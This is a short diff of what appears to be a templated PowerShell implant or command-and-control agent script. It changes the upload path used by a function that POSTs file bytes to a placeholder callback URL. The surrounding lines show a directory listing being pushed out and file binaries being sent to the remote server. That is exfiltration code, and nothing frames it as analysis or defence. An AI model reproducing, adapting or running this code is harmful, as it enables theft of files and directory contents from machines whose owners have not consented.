@@ -664,7 +664,7 @@ function Send-BytesViaHttp {
     $postbody = [System.Text.Encoding]::UTF8.GetBytes($postbody)
 
     $ProgressPreference = 'SilentlyContinue'
-    $post_url = "$(${CALLBACK_URL})u?script"
+    $post_url = "$(${CALLBACK_URL})upload?script"
     {{'Write-Debug "POSTing the file to $post_url..."'|debug}}
     $WebRequest = [System.Net.WebRequest]::Create($post_url)
     $WebRequest.Method = "POST"
@@ -755,7 +755,6 @@ Get-ChildItem | PushTo-Hub -Name "directory-listing"
                 }
 
                 Send-Bytes $fileBin $filename
-
             }
         }
     }
